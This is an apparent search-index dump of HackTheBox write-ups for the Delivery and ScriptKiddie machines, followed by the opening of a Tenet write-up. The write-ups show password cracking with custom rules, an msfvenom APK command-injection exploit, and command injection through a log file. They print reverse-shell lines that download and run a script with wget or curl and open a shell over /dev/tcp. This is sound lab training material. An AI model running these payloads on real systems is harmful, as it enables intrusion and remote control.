    "content": "#HackTheBox #Linux #Easy #insecure-credentials #password-reuse #hashcat-custom-rules #john-custom-rules #B2R #writeup . . | Introduction . | Improved skills: | Used tools: | . | Enumeration | Foothold | Privilege Escalation | Trophy | . Introduction . Delivery is an easy difficulty Linux machine based on web sites enumeration and putting the pieces together in order to abuse a ‚Äúby-design‚Äù function and get access to a restricted area where a password is disclosed. Once obtained a low-privileged access to the target it was possible to leak mysql credentials and database contents, obtaining a list of users and relative hashes. Cracking those hashes it was possible to obtain the root password. Because it reused the same credential also for the machine, reusing the same credentials provided a high privileged access to the target. Improved skills: . | Enumeration &amp; smart thinking | Password hunting | hachat / john custom rules | . Used tools: . | nmap | gobuster | hashcat | john | . Enumeration . Scanned all TCP ports: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ sudo nmap -p- 10.10.10.222 -sS -Pn -oN scans/all-ports.txt -v [sudo] password for kali: ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8065/tcp open unknown Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 55.58 seconds Raw packets sent: 65621 (2.887MB) | Rcvd: 65796 (2.684MB) . Enumerated open TCP open ports: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ sudo nmap -p22,80,8065 -sV -sC 10.10.10.222 -sT -Pn -oN scans/open-tcp-ports.txt ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) | 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache, max-age=31556926, public | Content-Length: 3108 | Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com | Content-Type: text/html; charset=utf-8 | Last-Modified: Sun, 25 Apr 2021 20:37:14 GMT | X-Frame-Options: SAMEORIGIN | X-Request-Id: 4rg44j93ajy9tnsgzhfznr9ngh | X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false | Date: Sun, 25 Apr 2021 20:44:57 GMT | &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\"&gt;&lt;meta name=\"robots\" content=\"noindex, nofollow\"&gt;&lt;meta name=\"referrer\" content=\"no-referrer\"&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=\"mobile-web-app-capable\" content=\"yes\"&gt;&lt;meta name=\"application-name\" content=\"Mattermost\"&gt;&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;&lt;link re | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Date: Sun, 25 Apr 2021 20:44:57 GMT |_ Content-Length: 0 ... Nmap discovered one SSH service runnin on port 22 and two different web services, one of them running on port 80 and the other one running on port 8065. Enumerated port 80 using web browser: . The site seemed to be a static web site. However the Contact us page revealed a sub-domain that could be interesting: . Added the subdomain to /etc/hosts and enumerated helpdesk.delivery.htb: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ sudo nano /etc/hosts ... 10.10.10.222 delivery.htb helpdesk.delivery.htb ... The site turned to be a support ticket system. Although it was possible to register an account, it was not possible to receive the verification email back. Because of this issue the only way to interact with the application was trough the Guest user. To spread the attack surface, files and directories of the helpdesk subdomain were also enumerated, allowing to find an additional login form: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ gobuster dir http://helpdesk.delivery.htb -w /usr/share/seclist/Discovery/Web-Contents/raft-medium-custom.txt -x php -t 30 ... /account.php (Status: 200) [Size: 37319] /ajax.php (Status: 400) [Size: 17] /api (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/api/] /apps (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/apps/] /assets (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/assets/] /avatar.php (Status: 400) [Size: 40] /captcha.php (Status: 200) [Size: 3377] /css (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/css/] /images (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/images/] /index.php (Status: 200) [Size: 4933] /js (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/js/] /kb (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/kb/] /login.php (Status: 422) [Size: 5181] /logo.php (Status: 302) [Size: 0] [--&gt; /assets/default/images/logo.png] /logout.php (Status: 302) [Size: 13] [--&gt; index.php] /manage.php (Status: 200) [Size: 63] /offline.php (Status: 302) [Size: 0] [--&gt; index.php] /open.php (Status: 200) [Size: 8133] /pages (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/pages/] /profile.php (Status: 422) [Size: 5181] /scp (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/scp/] /. (Status: 301) [Size: 185] [--&gt; http://helpdesk.delivery.htb/./] /tickets.php (Status: 422) [Size: 5181] /view.php (Status: 200) [Size: 5263] /web.config (Status: 200) [Size: 2197] ... After having enumerated the port 80, it was time to check also the service on port 8065, which turned to be a Mattermost application: . As for helpdesk.delivery.htb also in this case it was necessary to receive a confirmation email to activate the account. Directories and files enumeration on this service were not fruitful, forcing to proceed ed with further analyses on the other service. Foothold . Guest users are allowed to open support ticket on the Support Center application: . Once opened a ticket, the site allowed to add comments to the ticket sending an email to the corresponding associated inbox. Having access to the ticket summary (through the id) and being able to receive emails, it was possible to abuse the send email function to receive the validation email from the Mattermost application and activate the account. Registered on Mattermost with 1203785@delivery.htb . Received the validation email in the form of a ticket update: . Activated the arbitrary account and logged inside the application: . Once inside the application some credentials were leaked due to an insecure communication channel and some other information about credentials rules were disclosed: . Leaked credentials were used and a low privileged access was obtained: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Delivery] ‚îî‚îÄ$ ssh maildeliverer@10.10.10.222 maildeliverer@10.10.10.222's password: Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Jan 5 06:09:50 2021 from 10.10.14.5 maildeliverer@Delivery:~$ whoami maildeliverer . Privilege Escalation . Local enumeration revealed a mysql service running on localhost: . maildeliverer@Delivery:/var/www/osticket$ netstat -polentau | grep 127 (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 110 15591 - off (0.00/0/0) tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN 0 16779 - off (0.00/0/0) tcp 0 0 127.0.0.1:1025 0.0.0.0:* LISTEN 0 17735 - off (0.00/0/0) ... osticket configuration file leaked mysql credentials: . maildeliverer@Delivery:/var/www/osticket$ cat ./upload/include/ost-config.php ... # Encrypt/Decrypt secret key - randomly generated during installation. define('SECRET_SALT','nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3'); #Default admin email. Used only on db connection issues and related alerts. define('ADMIN_EMAIL','maildeliverer@delivery.htb'); # Database Options # --------------------------------------------------- # Mysql Login info define('DBTYPE','mysql'); define('DBHOST','localhost'); define('DBNAME','osticket'); define('DBUSER','ost_user'); define('DBPASS','!H3l&lt;redacted&gt;'); # Table prefix define('TABLE_PREFIX','ost_'); ... mattermost configuration file leaked mysql credentials: . maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep -i sql -C5 \"DesktopLatestVersion\": \"\", \"DesktopMinVersion\": \"\", \"IosLatestVersion\": \"\", \"IosMinVersion\": \"\" }, \"SqlSettings\": { \"DriverName\": \"mysql\", \"DataSource\": \"mmuser:Crack_...........@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\", \"DataSourceReplicas\": [], \"DataSourceSearchReplicas\": [], \"MaxIdleConns\": 20, \"ConnMaxLifetimeMilliseconds\": 3600000, . Logged within mysql using osticket leaked credentials and extracted password hashes for registered users: . maildeliverer@Delivery:/var/www/osticket$ mysql -u ost_user -p -D osticket Enter password: ... MariaDB [osticket]&gt; select username,passwd,email,isadmin from ost_staff; +---------------+--------------------------------------------------------------+----------------------------+---------+ | username | passwd | email | isadmin | +---------------+--------------------------------------------------------------+----------------------------+---------+ | maildeliverer | $2a$08$VlccTgoFaxEaGJ....................................... | maildeliverer@delivery.htb | 1 | +---------------+--------------------------------------------------------------+----------------------------+---------+ 1 row in set (0.000 sec) ... Logged within mysql using mattermost leaked credentials and extracted password hashes for registered users: . maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p ... MariaDB [(none)]&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | mattermost | +--------------------+ 2 rows in set (0.000 sec) ... MariaDB [mattermost]&gt; select username, Password from Users; +----------------------------------+--------------------------------------------------------------+ | username | Password | +----------------------------------+--------------------------------------------------------------+ | surveybot | | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZ...................................... | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1...................................... | root | $2a$10$VM6EeymRxJ29r8W...................................... | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUc...................................... | channelexport | | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJ...................................... | maoutis | $2a$10$n5KAvICmMNkb.p2...................................... | +----------------------------------+--------------------------------------------------------------+ 8 rows in set (0.000 sec) . Following the hint gave inside the Mattermost application . Also please create a program to help us stop re-using the same passwords everywhere‚Ä¶. Especially those that are a variant of ‚ÄúPleaseSubscribe!‚Äù . it was possible to crack the root user password using hashcat custom rules: . Used rules: https://github.com/praetorian-inc/Hob0Rules/blob/master/d3adhob0.rule . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ hashid '$2a$10$VM6EeymRxJ29r8.......................................' Analyzing '$2a$10$VM6EeymRxJ29r8.......................................' [+] Blowfish(OpenBSD) [+] Woltlab Burning Board 4.x [+] bcrypt ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ hashid maildeliverer-admin.passwd --File 'maildeliverer-admin.passwd'-- Analyzing '$2a$10$VM6EeymRxJ29r8.......................................' [+] Blowfish(OpenBSD) [+] Woltlab Burning Board 4.x [+] bcrypt --End of file 'maildeliverer-admin.passwd'-- ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ echo 'PleaseSubscribe!' &gt; base_passwords ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ cat mattermost-hashes.passwd| grep root &gt; root.passwd ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ hashcat root.passwd base_passwords -m3200 -r d3adhob0.rule --force --username --separator \":\" hashcat (v6.1.1) starting..... $2a$10$VM6EeymRxJ29r8.......................................:PleaseSubscribe!&lt;redacted&gt; ... The same can be achieved also using john-the-ripper and john custom rules: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ sudo nano /etc/john/john.conf ... [List.Rules:Custom] : # Add one number $[0-9] # Add one number and a sybol $[0-9]$[$%^&amp;*()\\\\-_+=|\\&lt;&gt;\\[\\]{}#@/~] # Add two number $[0-9]$[0-9] # Add two number and a symbol $[0-9]$[0-9]$[$%^&amp;*()\\\\-_+=|\\&lt;&gt;\\[\\]{}#@/~] ... ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Delivery/loot] ‚îî‚îÄ$ john root.passwd --wordlist=base_passwords --rules=Custom --fork=5 Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Node numbers 1-5 of 5 (fork) Each node loaded the whole wordfile to memory Press 'q' or Ctrl-C to abort, almost any other key for status PleaseSubscribe!&lt;redacted&gt; (root) ... Once obtained the root password it was possible to change the account to the root one: . maildeliverer@Delivery:~$ su root Password: root@Delivery:/home/maildeliverer# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ip a root Delivery 1df26a288718072c85da8349534ed570 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:cb:0a brd ff:ff:ff:ff:ff:ff inet 10.10.10.222/24 brd 10.10.10.255 scope global ens192 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:cb0a/64 scope global dynamic mngtmpaddr valid_lft 86036sec preferred_lft 14036sec inet6 fe80::250:56ff:feb9:cb0a/64 scope link valid_lft forever preferred_lft forever . Trophy . As always we start with nmap... but it can take a while so I've already ran it - ippsec . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2021-05-22-Delivery/",
    "relUrl": "/writeups/HackTheBox/2021-05-22-Delivery/"
  },"31": {
    "doc": "Delivery",
    "title": "Delivery",
    "content": "22 May 2021 | Reading time: ~10 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2021-05-22-Delivery/",
    "relUrl": "/writeups/HackTheBox/2021-05-22-Delivery/"
  },"32": {
    "doc": "ScriptKiddie",
    "title": "HackTheBox - ScriptKiddie [Easy] ",
    "content": "#HackTheBox #Easy #Linux #CVE-2020-7384 #msfvenom-command-injection #command-injection #lateral-movement #insecure-file-permissions #msfconsole-privesc #B2R #writeup . . | Introduction . | Improved skills: | Used tools: | . | Enumeration | Foothold | Lateral Movement to pwn | Privilege Escalation | Trophy | . Introduction . ScriptKiddie is an easy difficulty Linux box based on known vulnerabilities for traditional hacking tools. The target machine ran a custom web application that interacted with different tools, one of which vulnerable to APK template command injection. Exploiting the issue it was possible to obtain a reverse shell and get a foothold on the target. Local enumeration allowed to find a custom script ran with user privileges, also vulnerable to command injection, which provided user access to the box. pwn was allowed to execute msfconsole with high privileges using sudo, allowing to spawn a high privileged shell . Improved skills: . | Command Injection Attacks | Code review | . Used tools: . | nmap | netcat | . Enumeration . Scanned all tcp ports: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/ScriptKiddie] ‚îî‚îÄ$ sudo nmap 10.10.10.226 -oN scans/all-ports.txt -sS -p- -v ... PORT STATE SERVICE 22/tcp open ssh 5000/tcp open http . Enumerated all open ports: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/ScriptKiddie] ‚îî‚îÄ$ sudo nmap 10.10.10.226 -oN scans/open-ports.txt -sT -sC -sV -Pn -p22,5000 ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA) | 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA) |_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-title: k1d'5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds . Nmap discovered two services running on the target: an ssh service on port 22 revealing the exact build version of openssh and a python web server running on a non traditional port. It was searched for known exploit targeting Werkzeug: However for the current target the debug shell was not enabled. Current web application features depended on different external tools (nmap, msfvenom and searchsploit), one of which vulnerable to APK template command injection. Foothold . The version of msfvenom used by the web application was vulnerable to APK template command injection (CVE-2020-7384). Metasploit msfvenom framework handles APK files in a way that allows for a malicious user to craft and publish a file that would execute arbitrary commands on a victim‚Äôs machine. Because the web site allowed to upload different files used as template by msfvenom, this was a solid path to follow (since no msfvenom version was obtained earlier). The PoC used to craft the malicious APK was the following: https://www.exploit-db.com/exploits/49491 The payload was then changed to download and execute a reverse shell on the victim machine: ... # Change me payload = 'wget -O - 10.10.14.14/revshell.sh | bash' ... This was the second stage payload downloaded and executed by the initial one: . bash -i &gt;&amp; /dev/tcp/10.10.14.14/443 0&gt;&amp;1 . The malicious apk file was generated and the second stage payload was hosted using python http server: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ python3 49491.py [+] Manufacturing evil apkfile Payload: wget -O - 10.10.14.14/revshell.sh | bash -dname: CN='|echo d2dldCAtTyAtIDEwLjEwLjE0LjE0L3JldnNoZWxsLnNoIHwgYmFzaA== | base64 -d | sh # adding: empty (stored 0%) Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true jar signed. Warning: The signer's certificate is self-signed. The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update. The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update. POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature. [+] Done! apkfile is at /tmp/tmps70hg8mz/evil.apk Do: msfvenom -x /tmp/tmps70hg8mz/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Uploaded the malicious apk to the application and obtained a reverse shell: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ sudo nc -nlvp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.10.14.14] from (UNKNOWN) [10.10.10.226] 56612 bash: cannot set terminal process group (895): Inappropriate ioctl for device bash: no job control in this shell kid@scriptkiddie:~/html$ whoami whoami kid kid@scriptkiddie:~/html$ hostname hostname scriptkiddie kid@scriptkiddie:~/html$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' kid@scriptkiddie:~/html$ ^Z zsh: suspended sudo nc -nlvp 443 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ stty raw -echo; fg [1] + continued sudo nc -nlvp 443 kid@scriptkiddie:~/html$ export TERM=xterm kid@scriptkiddie:~/html$ stty rows 60 columns 235 . Lateral Movement to pwn . Observing the running processes and local enumerating the box it was possible to discover a bash script vulnerable to code injection ran by the pwn user: . kid@scriptkiddie:~/html$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash ... kid:x:1000:1000:kid:/home/kid:/bin/bash pwn:x:1001:1001::/home/pwn:/bin/bash kid@scriptkiddie:/var/www$ id uid=1000(kid) gid=1000(kid) groups=1000(kid) 2021/04/21 12:51:12 CMD: UID=1001 PID=64051 | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:12 CMD: UID=1001 PID=64055 | 2021/04/21 12:51:12 CMD: UID=1001 PID=64054 | 2021/04/21 12:51:12 CMD: UID=1001 PID=64059 | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:12 CMD: UID=1001 PID=64058 | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:12 CMD: UID=1001 PID=64057 | nmap --top-ports 10 -oN recon/10.10.14.14.nmap 10.10.14.14 2021/04/21 12:51:12 CMD: UID=1001 PID=64056 | sh -c nmap --top-ports 10 -oN recon/10.10.14.14.nmap 10.10.14.14 2&gt;&amp;1 &gt;/dev/null 2021/04/21 12:51:13 CMD: UID=1001 PID=64064 | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:13 CMD: UID=1001 PID=64063 | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:13 CMD: UID=1001 PID=64062 | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:13 CMD: UID=1001 PID=64061 | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:13 CMD: UID=1001 PID=64060 | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:14 CMD: UID=0 PID=64067 | /usr/sbin/incrond 2021/04/21 12:52:01 CMD: UID=0 PID=64081 | /bin/sh -c find /home/kid/html/static/payloads/ -type f -mmin +5 -delete 2021/04/21 12:52:01 CMD: UID=0 PID=64080 | /usr/sbin/CRON -f ... 2021/04/21 12:56:57 CMD: UID=1001 PID=64210 | /bin/bash -c sed -i 's/open /closed/g' \"/home/pwn/recon/10.10.14.14.nmap\" . The scanlosers.sh script ran every time a hack was detected. It read data from a writable log file owned by kid (current user) and used them to build an nmap command: . #!/bin/bash log=/home/kid/logs/hackers cd /home/pwn/ cat $log | cut -d' ' -f3- | sort -u | while read ip; do sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null\" &amp; done if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi . A ping command was injected inside the log file to verify the vulnerability: . kid@scriptkiddie:~/logs$ echo '0 0 $(ping -c1 10.10.14.14)' &gt; hackers . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/ScriptKiddie/loot/pwn_script] ‚îî‚îÄ$ sudo tcpdump icmp -i tun0 [sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 12:20:06.879068 IP 10.10.10.226 &gt; 10.10.14.14: ICMP echo request, id 5, seq 1, length 64 12:20:06.879098 IP 10.10.14.14 &gt; 10.10.10.226: ICMP echo reply, id 5, seq 1, length 64 12:20:06.930982 IP 10.10.10.226 &gt; 10.10.14.14: ICMP echo request, id 6, seq 1, length 64 12:20:06.931030 IP 10.10.14.14 &gt; 10.10.10.226: ICMP echo reply, id 6, seq 1, length 64 . Proved that it was possible to execute code, a two-stage reverse shell payload was then used. Served the same reverse shell used during the foothold: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Injected the staged command within the log: . kid@scriptkiddie:~/logs$ echo '0 0 $(curl 10.10.14.14/revshell.sh | bash )' &gt; hackers . Obtained the reverse shell: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/ScriptKiddie/loot/pwn_script] ‚îî‚îÄ$ sudo nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.14] from (UNKNOWN) [10.10.10.226] 56974 bash: cannot set terminal process group (856): Inappropriate ioctl for device bash: no job control in this shell pwn@scriptkiddie:~$ whoami whoami pwn pwn@scriptkiddie:~$ . Privilege Escalation . Enumerated sudo privileges of the pwn user: . pwn@scriptkiddie:~$ sudo -l Matching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole . Because the pwn user was able to execute the msfconsole tool with high privileges and the tool itself offered a builtin function to spawn a shell, it was possible to leverage this feature to obtain a full interactive root shell: . pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole -q msf6 &gt; bash [*] exec: bash root@scriptkiddie:/home/pwn# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig -a root scriptkiddie db90201a61bd45b56fe74fb7a44253ee ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 10.10.10.226 netmask 255.255.255.0 broadcast 10.10.10.255 inet6 fe80::250:56ff:feb9:a9c3 prefixlen 64 scopeid 0x20&lt;link&gt; inet6 dead:beef::250:56ff:feb9:a9c3 prefixlen 64 scopeid 0x0&lt;global&gt; ether 00:50:56:b9:a9:c3 txqueuelen 1000 (Ethernet) RX packets 31355 bytes 6228551 (6.2 MB) RX errors 0 dropped 59 overruns 0 frame 0 TX packets 20962 bytes 24340256 (24.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 53480 bytes 3798372 (3.7 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 53480 bytes 3798372 (3.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 . Trophy . A hacker does for love what others would not do for money - Laura Creighton . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2021-06-05-ScriptKiddie/",
    "relUrl": "/writeups/HackTheBox/2021-06-05-ScriptKiddie/"
  },"33": {
    "doc": "ScriptKiddie",
    "title": "ScriptKiddie",
    "content": "05 Jun 2021 | Reading time: ~7 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2021-06-05-ScriptKiddie/",
    "relUrl": "/writeups/HackTheBox/2021-06-05-ScriptKiddie/"
  },"34": {
    "doc": "Tenet",
    "title": "HackTheBox - Tenet [Medium] ",
    "content": "#HackTheBox #Medium #Linux #B2R #code-review #php-deserialization #password-reuse #hardcoded-credentials #race-condition #temp-file-poisoning #writeup . . | Introduction . | Improved skills: | Used tools: | . | Enumeration | Foothold | Lateral Movement | Privilege Escalation | Trophy | Video | . Introduction . Tenet is a medium difficulty Linux box based on code review. Initial enumeration allowed to discover a PHP file vulnerable to PHP deserialization, allowing to get a foothold on the box. Local enumeration allowed to discover hardcoded credentials and reuse them to get user access. From there, privilege escalation can be achieved exploiting a race condition on a sudo script which allowed to overwrite root‚Äôs private key and obtain a high privileged access. Improved skills: . | Code review | PHP deserialization attacks | Exploiting race condition | Poisoning unsecured file | . Used tools: . | nmap | gobuster | wpscan | custom PHP script | . Enumeration . Scanned all TCP ports: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ sudo nmap -p- 10.10.10.223 -sS -Pn -v ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http . Enumerated open TCP ports: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ sudo nmap -p22,80 10.10.10.223 -sT -sV -sC -Pn -v -oN scans/open-tcp-ports.txt ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel . Nmap revealed an Apache2 Ubuntu Default Page on port 80 and an OpenSSH service on port 22. Because SSH usually does not offer a large attack surface, enumeration of target 